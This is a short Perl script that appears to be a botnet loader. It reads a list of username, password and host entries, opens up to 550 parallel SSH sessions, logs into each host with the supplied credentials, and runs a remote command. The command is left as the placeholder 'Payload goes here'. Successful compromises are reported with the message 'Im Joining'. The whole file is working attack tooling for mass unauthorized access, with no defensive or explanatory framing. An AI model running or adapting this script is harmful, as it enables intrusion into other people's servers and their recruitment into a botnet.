#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('Payload goes here');
                        sleep 10;
                        $channel->close;
                        print "\x1b[1;36Im Joining:\x1b[1;37m".$newarray[$c]."\n";
                } else {
                        print "\x1b[0;35mIm Dead\n";
                }
        } else {
                print "\x1b[1;31mIm Not Joining\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

